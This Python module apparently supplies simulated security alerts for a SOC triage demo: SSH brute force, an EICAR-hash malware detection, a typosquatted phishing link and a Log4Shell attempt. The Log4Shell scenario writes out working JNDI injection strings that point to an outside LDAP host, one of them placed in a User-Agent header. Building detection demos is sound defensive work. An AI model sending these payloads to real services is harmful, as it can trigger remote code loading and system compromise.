"""
AEGIS SOC — Alert Simulator
Realistic demo scenarios using known IOCs that produce real API responses.

IOC Reference:
  - 45.33.32.156      → Nmap.org scanner IP — AbuseIPDB flags it
  - 44d88612fea8...    → EICAR test hash — VirusTotal detects it cleanly
  - CVE-2021-44228     → Log4Shell — NVD returns CVSS 10.0 critical
  - evil-login.microsofft.com → Typosquatting domain — VT flags categories
"""

from datetime import datetime, timezone


DEMO_SCENARIOS = {

    # ── 1. SSH Brute Force from Known Scanner ──
    "suspicious_ip": {
        "source": "SIEM-SPLUNK",
        "title": "SSH Brute Force Attack Detected",
        "description": "Multiple failed SSH login attempts from external IP followed by successful authentication. Unusual login time (03:42 UTC) from geo-location inconsistent with user profile.",
        "alert_type": "suspicious_ip",
        "severity_hint": "high",
        "primary_ioc": "45.33.32.156",
        "ioc_type": "ip",
        "source_ip": "8.8.8.8",
        "destination_ip": "10.0.1.45",
        "destination_port": 22,
        "attempt_count": 847,
        "timeframe": "last 5 minutes",
        "affected_system": "prod-api-server-01",
        "hostname": "prod-api-server-01",
        "user": "root",
        "log_snippet": "Jan 15 03:22:11 sshd[12847]: Failed password for root from 45.33.32.156 port 52341 ssh2\nJan 15 03:27:44 sshd[12847]: Accepted password for root from 45.33.32.156 port 52341 ssh2",
        "raw_log": "sshd[12847]: Failed password for root from 45.33.32.156 port 52341 ssh2 (847 attempts in 300s)",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    },

    # ── 2. Malware Binary on Endpoint (EICAR test hash) ──
    "malware_hash": {
        "source": "EDR-CrowdStrike",
        "title": "Known Malware Binary Detected on Endpoint",
        "description": "Suspicious executable detected on endpoint. File matches known malware signature. Process attempted to establish outbound C2 connection.",
        "alert_type": "malware_hash",
        "severity_hint": "critical",
        "primary_ioc": "44d88612fea8a8f36de82e1278abb02f",
        "ioc_type": "hash",
        "file_hash": "44d88612fea8a8f36de82e1278abb02f",
        "file_name": "svchost_update.exe",
        "file_path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost_update.exe",
        "process_id": 4821,
        "source_ip": "10.0.2.100",
        "destination_ip": "185.220.101.1",
        "affected_host": "DESKTOP-HR-042",
        "hostname": "DESKTOP-HR-042",
        "user": "jsmith",
        "action_taken": "quarantined",
        "raw_log": "ALERT: Malicious file detected. MD5: 44d88612fea8a8f36de82e1278abb02f. Process: svchost_update.exe (PID 4821). Outbound connection to 185.220.101.1:443",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    },

    # ── 3. Phishing Email with Credential Harvesting ──
    "phishing_email": {
        "source": "Email-Gateway",
        "title": "Phishing Email with Malicious Link Clicked",
        "description": "Phishing email from spoofed sender containing link to credential harvesting page. User clicked the link. URL mimics Microsoft login portal using typosquatting.",
        "alert_type": "phishing",
        "severity_hint": "high",
        "primary_ioc": "evil-login.microsofft.com",
        "ioc_type": "domain",
        "domain": "evil-login.microsofft.com",
        "email_sender": "noreply@microsofft.com",
        "recipient": "cfo@company.com",
        "subject": "Urgent: Your account will be suspended",
        "clicked_url": "https://evil-login.microsofft.com/signin",
        "user_ip": "192.168.1.105",
        "email_id": "MSG-20240115-8821",
        "hostname": "mail-gw-01",
        "user": "cfo",
        "raw_log": "Email Gateway: SUSPICIOUS link clicked. Sender: noreply@microsofft.com -> cfo@company.com. URL: evil-login.microsofft.com/signin",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    },

    # ── 4. Log4Shell Exploitation Attempt ──
    "cve_exploit": {
        "source": "IDS-Snort",
        "title": "Log4Shell (CVE-2021-44228) Exploitation Attempt Detected",
        "description": "Intrusion detection system flagged Log4Shell exploitation attempt in incoming web request. JNDI lookup payload detected targeting customer portal.",
        "alert_type": "cve_exploit",
        "severity_hint": "critical",
        "primary_ioc": "CVE-2021-44228",
        "ioc_type": "cve",
        "cve_id": "CVE-2021-44228",
        "attacker_ip": "45.33.32.156",
        "source_ip": "45.33.32.156",
        "destination_ip": "10.0.0.1",
        "target_service": "customer-portal",
        "payload": "${jndi:ldap://45.33.32.156:1389/exploit}",
        "request_path": "/api/v2/login",
        "user_agent": "Mozilla/5.0 ${jndi:ldap://45.33.32.156:1389/a}",
        "hostname": "fw-edge-01",
        "severity_from_ids": "CRITICAL",
        "raw_log": "IDS ALERT [1:2024044228:1] Log4Shell CVE-2021-44228 attempt. POST /api/v2/login HTTP/1.1 | Payload: ${jndi:ldap://45.33.32.156:1389/exploit}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    },
}


def get_demo_alert(scenario: str) -> dict:
    """Get a pre-built demo alert by scenario name."""
    # Refresh timestamps on each call
    alert = DEMO_SCENARIOS.get(scenario, DEMO_SCENARIOS["suspicious_ip"]).copy()
    alert["timestamp"] = datetime.now(timezone.utc).isoformat()
    return alert


def list_scenarios() -> list[str]:
    """List all available demo scenario names."""
    return list(DEMO_SCENARIOS.keys())
